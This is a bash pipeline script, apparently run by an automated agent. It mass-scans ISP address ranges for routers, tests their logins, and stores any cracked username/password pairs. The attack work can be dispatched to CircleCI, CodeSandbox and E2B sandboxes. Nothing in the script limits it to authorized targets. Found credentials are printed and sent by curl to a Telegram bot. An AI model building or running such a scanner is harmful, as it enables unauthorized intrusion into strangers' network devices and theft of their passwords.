#!/bin/bash
# ============================================================================
# Auto pipeline: scan -> detect -> audit (raw+browser) -> sync -> notify
# Запуск: ./pipeline.sh [batch_size]  (по умолчанию 100000)
# ============================================================================
set -e
cd /root/scan
BATCH=${1:-100000}
AGENT="Agent-Arena-01"
TS=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
LOG="logs/pipeline_$(date -u +%Y%m%d_%H%M%S).log"

log() { echo "[$(date -u +%H:%M:%S)] $1" | tee -a "$LOG"; }

log "=== PIPELINE START ($TS, batch=$BATCH) ==="

# №2: мониторинг диска — если < 3 ГБ, чистим старые чанки/логи
FREE_GB=$(df -BG / | awk 'NR==2 {gsub("G","",$4); print $4}')
log "Свободно на диске: ${FREE_GB}G"
if [ "${FREE_GB%.*}" -lt 3 ]; then
  log "⚠️ МАЛО МЕСТА! Автоочистка..."
  find data/scans -name "*.csv.gz" -mtime +3 -delete 2>/dev/null || true
  find logs -name "*.log*" -mtime +7 -delete 2>/dev/null || true
  find /root/scan -name "__pycache__" -exec rm -rf {} + 2>/dev/null || true
  apt-get clean 2>/dev/null || true
  FREE_GB=$(df -BG / | awk 'NR==2 {gsub("G","",$4); print $4}')
  log "После очистки: ${FREE_GB}G"
fi

# №3: ежедневный бэкап БД (ротация 7)
BK_DIR="/root/scan/backups"
mkdir -p "$BK_DIR"
BK_FILE="$BK_DIR/isp_cidr_$(date -u +%Y%m%d).db.gz"
if [ ! -f "$BK_FILE" ]; then
  log "Бэкап БД -> $BK_FILE"
  gzip -c isp_cidr.db > "$BK_FILE" 2>/dev/null || true
  find "$BK_DIR" -name "*.db.gz" -mtime +7 -delete 2>/dev/null || true
fi

# 1. sync
git pull --rebase origin main 2>&1 | tail -1 >> "$LOG" || true

# 2. lock
python3 agent_sync.py lock --agent "$AGENT" --task "Auto pipeline scan" \
  --step "Scanning $BATCH IP" --machine "aios-server" >> "$LOG" 2>&1 || true

# 3. scan — локально ИЛИ через dispatch (SCAN_MODE=dispatch раздаёт по машинам)
SCAN_MODE="${SCAN_MODE:-local}"   # local | dispatch
if [ "$SCAN_MODE" = "dispatch" ]; then
  SHARDS="${SHARDS:-3}"
  log "Сканирование $BATCH IP через dispatch ($SHARDS шардов, порты ${PORTS:-80,8080,8443})..."
  timeout 3600 python3 -u dispatch.py scan --batch "$BATCH" --shards "$SHARDS" \
    --ports "${PORTS:-80,8080,8443}" --parallel >> "$LOG" 2>&1 || true
else
  # локально (оптимизировано: ulimit + timeout 1.0 + 1000 потоков = ~1000 IP/сек)
  log "Сканирование $BATCH IP локально (порты: ${PORTS:-80,8080,8443})..."
  ulimit -n 65535 2>/dev/null || true
  python3 port_scanner.py run --batch "$BATCH" --concurrency 1000 --timeout 1.0 \
    --ports "${PORTS:-80,8080,8443}" >> "$LOG" 2>&1
fi
log "Скан завершён."

# 4. find new routers count
NEW_RAW=$(python3 -c "
import sqlite3
conn = sqlite3.connect('isp_cidr.db')
print(conn.execute('SELECT COUNT(*) FROM scan_routers WHERE auth_checked=0').fetchone()[0])
conn.close()
")
NEW_BR=$(python3 -c "
import sqlite3
conn = sqlite3.connect('isp_cidr.db')
print(conn.execute('SELECT COUNT(*) FROM scan_routers WHERE browser_checked=0 AND auth_result=\"no-verifiable-channel\"').fetchone()[0])
conn.close()
")
log "Новых роутеров: raw=$NEW_RAW, browser=$NEW_BR"

# 5. raw audit (fast) — локально (быстро)
if [ "$NEW_RAW" -gt 0 ]; then
  log "Fast raw audit ($NEW_RAW устройств)..."
  python3 router_auth_check.py --fast --concurrency 30 --timeout 4 >> "$LOG" 2>&1 || true
fi

# 6. АВТО-DISPATCH: раздача задач по исполнителям (circleci/codesandbox/e2b/local)
#     - browser-аудит SPA (если есть no-verifiable-channel)
#     - точечный аудит непроверенных (CodeSandbox/E2B)
#     - InternetDB (если INTERNETDB=1)
AUDIT_MODE="${AUDIT_MODE:-auto}"   # auto | manual (manual = только локально)
if [ "$AUDIT_MODE" = "auto" ] && [ "$NEW_BR" -gt 0 ]; then
  log "Авто-dispatch: browser-аудит $NEW_BR SPA-целей..."
  timeout 2400 python3 dispatch.py audit_browser --shards 2 >> "$LOG" 2>&1 || true
  log "Авто-dispatch: точечный аудит CodeSandbox..."
  timeout 1200 python3 dispatch.py csb_probe --batch 20 >> "$LOG" 2>&1 || true
  log "Авто-dispatch: точечный аудит E2B..."
  timeout 1200 python3 dispatch.py e2b_probe --batch 20 >> "$LOG" 2>&1 || true
elif [ "$NEW_BR" -gt 0 ]; then
  log "Browser audit (manual mode, локально)..."
  .venv/bin/python -u router_auth_browser.py --only-no-channel --pairs 8 \
    --concurrency 4 --timeout 7 --wait 2.5 >> "$LOG" 2>&1 || true
fi

# 8b. InternetDB enrichment (опционально: INTERNETDB=1 ./pipeline.sh)
if [ "${INTERNETDB:-0}" = "1" ]; then
  log "InternetDB enrichment..."
  timeout 600 python3 internetdb_enrich.py --delay 0.2 >> "$LOG" 2>&1 || true
fi

# 9. results & notify
FOUND=$(python3 -c "
import sqlite3
conn = sqlite3.connect('isp_cidr.db')
print(conn.execute('SELECT COUNT(*) FROM router_credentials').fetchone()[0])
conn.close()
")
log "Найдено пар: $FOUND"
if [ "$FOUND" -gt 0 ]; then
  log "!!! НАЙДЕНЫ ПАРОЛИ — проверьте router_credentials !!!"
  python3 -c "
import sqlite3
conn = sqlite3.connect('isp_cidr.db')
conn.row_factory = sqlite3.Row
for r in conn.execute('SELECT ip, vendor, username, password, auth_method FROM router_credentials'):
    print('  НАХОДКА: %s %s %s/%s (%s)' % (r['ip'], r['vendor'], r['username'], r['password'] or '(пусто)', r['auth_method']))
conn.close()
" | tee -a "$LOG"
  # Telegram-уведомление (если настроен токен в .env)
  if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
    MSG="RouterScan: найдена пара $(python3 -c "
import sqlite3
conn = sqlite3.connect('isp_cidr.db')
r = conn.execute('SELECT ip, vendor, username, password FROM router_credentials ORDER BY id DESC LIMIT 1').fetchone()
conn.close()
print('%s %s %s/%s' % (r[0], r[1], r[2], r[3] or '(empty)'))
")"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
      -d chat_id="$TELEGRAM_CHAT_ID" -d text="$MSG" > /dev/null || true
  fi
else
  log "Паролей не найдено (все устройства закрыты)."
fi

# 10. complete + sync + push
python3 agent_sync.py complete --agent "$AGENT" --task "Auto pipeline scan" >> "$LOG" 2>&1 || true
python3 sync_manager.py "$AGENT" >> "$LOG" 2>&1 || true
log "=== PIPELINE DONE ==="
